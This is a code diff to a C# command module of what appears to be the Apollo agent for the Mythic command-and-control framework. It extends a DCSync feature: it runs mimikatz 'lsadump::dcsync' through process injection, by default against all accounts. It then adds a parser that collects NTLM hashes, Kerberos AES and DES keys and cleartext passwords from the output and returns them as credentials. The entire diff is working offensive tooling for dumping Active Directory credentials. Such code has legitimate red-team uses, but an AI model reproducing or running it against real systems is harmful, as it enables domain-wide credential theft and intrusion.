@@ -54,6 +54,7 @@ namespace Apollo.CommandModules
     {
         public string domain;
         public string user;
+        public string dc;
         public string loader_stub_id;
         public string pipe_name;
     }
@@ -394,34 +395,44 @@ namespace Apollo.CommandModules
             string pipeName;
             JObject json;
             List<string> output = new List<string>();
-            string formatCommand = "\"lsadump::dcsync /domain:{0} /user:{1}\"";
+            string formatCommand = "\"lsadump::dcsync /domain:{0} /{1} /dc:{2}\"";
 
             dcsParams = JsonConvert.DeserializeObject<DCSyncParameters>(job.Task.parameters);
             if (string.IsNullOrEmpty(dcsParams.domain))
             {
-                job.SetError("Missing required parameter: domain");
+                dcsParams.domain = "";
+            }
+            else if (dcsParams.domain.Split(' ').Length > 1)
+            {
+                job.SetError($"Invalid domain: {dcsParams.domain}");
                 return;
             }
 
             if (string.IsNullOrEmpty(dcsParams.user))
             {
-                job.SetError("Missing required parameter: user");
-                return;
+                dcsParams.user = "all";
             }
-
-            if (dcsParams.domain.Split(' ').Length > 1)
+            else
             {
-                job.SetError($"Invalid domain: {dcsParams.domain}");
-                return;
+                dcsParams.user = "user:" + dcsParams.user;
             }
-            
             if (dcsParams.user.Split(' ').Length > 1)
             {
                 job.SetError($"Invalid user: {dcsParams.user}");
                 return;
             }
 
-            command = string.Format(formatCommand, dcsParams.domain, dcsParams.user);
+            if (string.IsNullOrEmpty(dcsParams.dc))
+            {
+                dcsParams.dc = "";
+            }
+            else if (dcsParams.dc.Split(' ').Length > 1)
+            {
+                job.SetError($"Invalid dc: {dcsParams.dc}");
+                return;
+            }
+
+            command = string.Format(formatCommand, dcsParams.domain, dcsParams.user, dcsParams.dc);
 
             byte[] loaderStub;
 
@@ -471,8 +482,9 @@ namespace Apollo.CommandModules
                 {
                     job.ProcessID = (int)sacrificialProcess.PID;
                     job.sacrificialProcess = sacrificialProcess;
-                    ApolloTaskResponse response; 
-                    
+                    ApolloTaskResponse response;
+                    List<Mythic.Structs.MythicCredential> creds = new List<Mythic.Structs.MythicCredential>();
+
                     if (sacrificialProcess.Inject(loaderStub))
                     {
                         //sacrificialProcess.CreateNewRemoteThread(tempBytes);
@@ -490,10 +502,86 @@ namespace Apollo.CommandModules
                             writer.Flush();
                             using (StreamReader sr = new StreamReader(pipeClient))
                             {
-                                //sr.ReadLine();
+                                bool inKerberos = false;
+                                bool inCleartext = false;
                                 var line = sr.ReadLine();
                                 while (line != null && line.ToUpper().Trim() != "EOF")
                                 {
+                                    Mythic.Structs.MythicCredential cred;
+                                    if (line.Contains("will be the domain"))
+                                    {
+                                        dcsParams.domain = line.Split('\'')[1];
+                                    }
+                                    else if (line.Contains("SAM Username"))
+                                    {
+                                        dcsParams.user = line.Split(':')[1].Trim();
+                                    }
+                                    else if (line.Contains("Hash NTLM:"))
+                                    {
+                                        cred = new Mythic.Structs.MythicCredential();
+                                        cred.account = dcsParams.user;
+                                        cred.credential = line.Split(':')[1].Trim(); ;
+                                        cred.credential_type = "hash";
+                                        cred.realm = dcsParams.domain;
+                                        cred.comment = "NTLM";
+                                        creds.Add(cred);
+                                    }
+                                    else if (line.Contains("Primary:Kerberos-Newer-Keys"))
+                                    {
+                                        inKerberos = true;
+                                    }
+                                    else if (line.Contains("aes256_hmac") && inKerberos)
+                                    {
+
+                                        cred = new Mythic.Structs.MythicCredential();
+                                        cred.account = dcsParams.user;
+                                        cred.credential = line.Split(':')[1].Trim(); ;
+                                        cred.credential_type = "hash";
+                                        cred.realm = dcsParams.domain;
+                                        cred.comment = "aes256_hmac";
+                                        creds.Add(cred);
+                                    }
+                                    else if (line.Contains("aes128_hmac") && inKerberos)
+                                    {
+                                        cred = new Mythic.Structs.MythicCredential();
+                                        cred.account = dcsParams.user;
+                                        cred.credential = line.Split(':')[1].Trim(); ;
+                                        cred.credential_type = "hash";
+                                        cred.realm = dcsParams.domain;
+                                        cred.comment = "aes128_hmac";
+                                        creds.Add(cred);
+                                    }
+                                    else if (line.Contains("des_cbc_md5") && inKerberos)
+                                    {
+
+                                        cred = new Mythic.Structs.MythicCredential();
+                                        cred.account = dcsParams.user;
+                                        cred.credential = line.Split(':')[1].Trim(); ;
+                                        cred.credential_type = "hash";
+                                        cred.realm = dcsParams.domain;
+                                        cred.comment = "des_cbc_md5";
+                                        creds.Add(cred);
+                                    }
+                                    else if (line.Contains("OldCredentials") || (inKerberos && line.Contains("*")))
+                                    {
+                                        inKerberos = false;
+                                    }
+                                    else if (line.Contains("CLEARTEXT"))
+                                    {
+                                        inCleartext = true;
+                                    }
+                                    else if (inCleartext)
+                                    {
+                                        cred = new Mythic.Structs.MythicCredential();
+                                        cred.account = dcsParams.user;
+                                        cred.credential = line.Trim(); ;
+                                        cred.credential_type = "plaintext";
+                                        cred.realm = dcsParams.domain;
+                                        cred.comment = "";
+                                        creds.Add(cred);
+                                        inCleartext = false;
+                                    }
+
                                     output.Add(line);
                                     line = sr.ReadLine();
                                 }
@@ -503,7 +591,12 @@ namespace Apollo.CommandModules
 
                             if (output.Count > 0)
                             {
-                                job.SetComplete(output.ToArray());
+                                response = new ApolloTaskResponse(job.Task, output.ToArray());
+                                if (creds.Count > 0)
+                                {
+                                    response.credentials = creds.ToArray();
+                                }
+                                job.SetComplete(response);
                             }
                         }
                         catch (Exception ex)
